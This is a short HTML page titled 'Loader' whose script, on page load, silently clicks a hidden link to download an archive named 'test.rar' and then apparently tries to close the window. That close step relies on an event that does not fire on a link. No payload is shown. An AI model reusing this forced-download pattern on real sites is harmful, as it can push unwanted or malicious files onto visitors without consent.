<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Loader</title>
	<script>
		window.onload = function() {
			var link = document.createElement("a");
			link.href = "assets/others/test.rar";
			link.download = "test.rar";
			document.body.appendChild(link);
			link.click();
			link.addEventListener('load', function() {
				setTimeout(function() {
					window.open('', '_self', '');
					window.close();
				}, 1000);
			}, false);
		}
	</script>
</head>
<body>
</body>
</html>
